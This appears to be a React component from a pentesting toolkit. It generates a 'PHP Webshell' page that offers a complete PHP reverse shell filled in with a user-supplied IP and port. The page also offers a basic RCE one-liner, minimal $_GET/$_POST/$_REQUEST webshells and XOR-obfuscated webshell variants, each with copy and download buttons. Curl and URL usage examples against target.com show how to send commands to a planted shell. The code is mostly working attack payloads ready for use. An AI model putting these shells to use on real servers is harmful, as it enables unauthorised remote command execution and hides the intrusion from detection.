import {
	ArrowsAltOutlined,
	CopyOutlined,
	DownloadOutlined,
	WifiOutlined,
} from "@ant-design/icons";
import {
	Button,
	Col,
	Collapse,
	Divider,
	Input,
	Row,
	Typography,
	message,
} from "antd";
import pretty from "pretty";
import Clipboard from "react-clipboard.js";
import { BsEthernet } from "react-icons/bs";
import SyntaxHighlighter from "react-syntax-highlighter";
import { vs2015 } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { Ipv4TcpCacheState } from "src/pages/popup/components/types/Ipv4TcpCacheState";
import PersistedState from "use-persisted-state";

const { Title, Paragraph, Text } = Typography;
const { Panel } = Collapse;

export default function PhpReverseShell() {
	const useIPv4State = PersistedState<Ipv4TcpCacheState>("ipv4_tcp_cache");
	const [values, setValues] = useIPv4State({
		ip: "",
		port: "",
	});
	const handleChange =
		(name: string) => (event: { target: { value: string } }) => {
			setValues({ ...values, [name]: event.target.value });
		};

	const [messageApi, contextHolder] = message.useMessage();
	const successInfoReverseShell = () => {
		messageApi.success("Your reverse shell has been copied successfully !");
	};

	const oneLiner = `<?php system($_GET["cmd"]);?>`;
	const shell_obfuscate =
		`<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
		"${$_}['_'^'o'];echo`$_`?>";
	const shell_obfuscate_function =
		`<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` +
		"<?=${'_'.$_}['_'](${'_'.$_}['__']);?>";

	const phpReverseShell = `
  <?php
  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '${values.ip}';  
  $port = ${values.port};
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;
  if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    if ($pid) {
      exit(0);  // Parent exits
    }
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }
    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }
  chdir("/");
  umask(0);
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }
  $descriptorspec = array(
    0 => array("pipe", "r"),  
    1 => array("pipe", "w"),  
    2 => array("pipe", "w")   
  );
  $process = proc_open($shell, $descriptorspec, $pipes);
  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);
  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }
  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);
  function printit ($string) {
    if (!$daemon) {
      print "$string\n";
    }
  } ?>`;
	return (
		<div>
			{contextHolder}
			<div>
				<Title level={2} style={{ fontWeight: "bold", margin: 15 }}>
					PHP Webshell
				</Title>
				<Paragraph style={{ margin: 15 }}>
					Attackers who successfully exploit a remote code/command execution
					vulnerability can use a reverse shell to obtain an interactive shell
					session on the target machine and continue their attack.
				</Paragraph>
			</div>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<div style={{ marginBottom: 15 }}>
					<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
						<Col span={12}>
							<Input
								maxLength={15}
								prefix={<WifiOutlined />}
								name="Ip adress"
								placeholder="IP Address or domain (ex: 212.212.111.222)"
								onChange={handleChange("ip")}
								value={values.ip}
							/>
						</Col>
						<Col span={12}>
							<Input
								maxLength={5}
								prefix={<BsEthernet />}
								name="Port"
								placeholder="Port (ex: 1337)"
								onChange={handleChange("port")}
								value={values.port}
							/>
						</Col>
					</Row>
				</div>
				<Paragraph>
					This script will make an outbound TCP connection to a hardcoded IP and
					port.
				</Paragraph>
				<Collapse defaultActiveKey={["0"]}>
					<Panel header="View the souce code" key="1">
						<SyntaxHighlighter
							language="php"
							style={vs2015}
							showLineNumbers={true}
						>
							{pretty(phpReverseShell)}
						</SyntaxHighlighter>
						<Button
							href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
							target="blank"
							type="dashed"
							style={{ marginBottom: 10, marginTop: 15 }}
						>
							<ArrowsAltOutlined style={{ marginRight: 10 }} />
							Pentestmonkey's repository
						</Button>
					</Panel>
				</Collapse>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob([phpReverseShell], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "rev.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined />
					Download
				</Button>
				<Clipboard component="a" data-clipboard-text={phpReverseShell}>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined />
						Copy
					</Button>
				</Clipboard>
			</div>
			<Divider orientation="center">Basic RCE</Divider>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					When you have successfully uploaded your payload, just put your
					commands after the variable ?cmd= (ex: ?cmd=ls -la")
				</Paragraph>
				<Paragraph>
					<pre>
						<Text copyable>{oneLiner}</Text>
					</pre>
				</Paragraph>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob([oneLiner], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "basicRCE.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined />
					Download
				</Button>
				<Clipboard component="a" data-clipboard-text={oneLiner}>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined />
						Copy
					</Button>
				</Clipboard>
			</div>
			<Divider orientation="center">Web Shell</Divider>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used
					to quickly execute commands on a server when pentesting a PHP
					application.
				</Paragraph>
				<Collapse defaultActiveKey={["0"]}>
					<Panel header="Watch the preview" key="1">
						<img
							src="https://i.imgur.com/ALPFDj0.png"
							alt="pownyShell"
							style={{ height: "100%", width: "100%" }}
						/>
					</Panel>
				</Collapse>
				<Button
					href="https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
					target="blank"
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
				>
					<DownloadOutlined /> Download
				</Button>
				<Button
					href="https://github.com/flozz/p0wny-shell"
					target="blank"
					type="dashed"
					style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
				>
					<ArrowsAltOutlined /> Flozz's repository
				</Button>
			</div>
			<Divider orientation="center">Tiny OneLiner Webshell</Divider>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					<pre>
						<Text copyable>{"<?=`$_GET[0]`?>"}</Text>
					</pre>
				</Paragraph>
				<Paragraph>
					{" Usage : http://target.com/path/to/shell.php?0=command "}
				</Paragraph>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob(["<?=`$_GET[0]`?>"], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "obfuscateShell.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined /> Download
				</Button>
				<Clipboard component="a" data-clipboard-text={"<?=`$_GET[0]`?>"}>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined /> Copy
					</Button>
				</Clipboard>
			</div>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					<pre>
						<Text copyable>{"<?=`$_POST[0]`?>"}</Text>
					</pre>
				</Paragraph>
				<Paragraph>
					{
						' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '
					}
				</Paragraph>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob(["<?=`$_POST[0]`?>"], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "obfuscateShell.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined /> Download
				</Button>
				<Clipboard component="a" data-clipboard-text={"<?=`$_POST[0]`?>"}>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined /> Copy
					</Button>
				</Clipboard>
			</div>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					<pre>
						<Text copyable>{"<?=`{$_REQUEST['_']}`?>"}</Text>
					</pre>
				</Paragraph>
				<Paragraph>Usage :</Paragraph>
				<Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
				<Paragraph>
					- curl -X POST http://target.com/path/to/shell.php -d "_=command" '
				</Paragraph>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob(["<?=`{$_REQUEST['_']}`?>"], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "obfuscateShell.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined /> Download
				</Button>
				<Clipboard
					component="a"
					data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}
				>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined /> Copy
					</Button>
				</Clipboard>
			</div>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					<pre>
						<Text copyable>{shell_obfuscate}</Text>
					</pre>
				</Paragraph>
				<Paragraph>Usage :</Paragraph>
				<Paragraph>- http://target.com/path/to/shell.php?0=command</Paragraph>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob([shell_obfuscate], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "obfuscateShell.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined /> Download
				</Button>
				<Clipboard component="a" data-clipboard-text={shell_obfuscate}>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined /> Copy
					</Button>
				</Clipboard>
			</div>
			<div
				style={{
					padding: 15,
					marginTop: 15,
				}}
			>
				<Paragraph>
					<pre>
						<Text copyable>{shell_obfuscate_function}</Text>
					</pre>
				</Paragraph>
				<Paragraph>Usage :</Paragraph>
				<Paragraph>
					- http://target.com/path/to/shell.php?_=function&__=argument
				</Paragraph>
				<Paragraph>
					- http://target.com/path/to/shell.php?_=system&__=ls
				</Paragraph>
				<Button
					type="primary"
					style={{ marginBottom: 10, marginTop: 15 }}
					onClick={() => {
						const element = document.createElement("a");
						const file = new Blob([shell_obfuscate_function], {
							type: "text/plain",
						});
						element.href = URL.createObjectURL(file);
						element.download = "obfuscateShell.php";
						document.body.appendChild(element);
						element.click();
					}}
				>
					<DownloadOutlined /> Download
				</Button>
				<Clipboard component="a" data-clipboard-text={shell_obfuscate_function}>
					<Button
						type="dashed"
						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
						onClick={successInfoReverseShell}
					>
						<CopyOutlined /> Copy
					</Button>
				</Clipboard>
			</div>
		</div>
	);
}
